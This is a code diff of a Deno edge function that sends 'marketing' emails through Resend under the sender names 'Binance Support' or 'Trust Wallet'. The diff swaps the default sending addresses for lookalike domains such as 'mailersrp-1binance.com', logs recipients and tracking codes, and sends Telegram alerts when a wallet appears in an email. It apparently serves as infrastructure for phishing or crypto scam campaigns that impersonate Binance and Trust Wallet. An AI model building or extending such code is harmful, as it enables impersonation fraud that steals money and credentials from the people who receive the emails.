@@ -177,12 +177,11 @@ const handler = async (req: Request): Promise<Response> => {
     const emailSenderName = isBinanceTemplate ? 'Binance Support' : 'Trust Wallet';
 
     // Set domain and API key based on preference
-    // Note: Using verified resend.dev domains until custom domains are verified in Resend
     if (emailPreference === 'domain2') {
-      fromDomain = `${emailSenderName} <hello@resend.dev>`;
-      resendApiKey = Deno.env.get('RESEND_API_KEY_DOMAIN2') ?? Deno.env.get('RESEND_API_KEY') ?? '';
+      fromDomain = `${emailSenderName} <do_not_reply@mailersrp-2binance.com>`;
+      resendApiKey = Deno.env.get('RESEND_API_KEY_DOMAIN2') ?? '';
     } else {
-      fromDomain = `${emailSenderName} <onboarding@resend.dev>`;
+      fromDomain = `${emailSenderName} <do_not_reply@mailersrp-1binance.com>`;
       resendApiKey = Deno.env.get('RESEND_API_KEY') ?? '';
     }
 
@@ -542,17 +541,19 @@ const handler = async (req: Request): Promise<Response> => {
       }
     } else {
       console.log('📨 USING RESEND METHOD...');
+      console.log(`Using API key for domain: ${emailPreference}, from: ${fromDomain}`);
       // Send via Resend API
       const resendClient = await getResend(resendApiKey);
       if (!resendClient) {
         throw new Error('Failed to initialize Resend client');
       }
       
+      try {
         emailResponse = await resendClient.emails.send({
           from: fromDomain,
           to: [to],
-        subject: emailSubject,
-        html: emailContent,
+          subject: emailSubject,
+          html: emailContent,
         tags: [
           {
             name: 'campaign',
@@ -568,9 +569,36 @@ const handler = async (req: Request): Promise<Response> => {
           }
         ]
       });
+      console.log("✅ Marketing email sent successfully:", emailResponse, "Method used:", sendMethod);
+      } catch (resendError: any) {
+        console.error('Failed to send email via Resend:', resendError);
+        console.error('Error details:', resendError.response?.data || resendError);
+        
+        // Log failed email in database
+        await supabase.from('email_logs').insert({
+          tracking_code: trackingCode,
+          recipient_email: to,
+          recipient_name: name,
+          contact_id: contact_id,
+          user_id: user_id,
+          template_id: template_id,
+          subject: emailSubject,
+          status: 'failed',
+          sent_at: new Date().toISOString(),
+          bounce_reason: resendError.message,
+          commercial_id: commercial_id
+        });
+        
+        return new Response(JSON.stringify({ 
+          success: false, 
+          error: 'Failed to send email', 
+          details: resendError.message 
+        }), {
+          status: 500,
+          headers: { "Content-Type": "application/json", ...corsHeaders }
+        });
+      }
     }
-
-    console.log("✅ Marketing email sent successfully:", emailResponse, "Method used:", sendMethod);
 
     // Send Telegram notification if wallet was used in email (send directly to Telegram; fallback to edge function)
     if (walletWasUsed) {
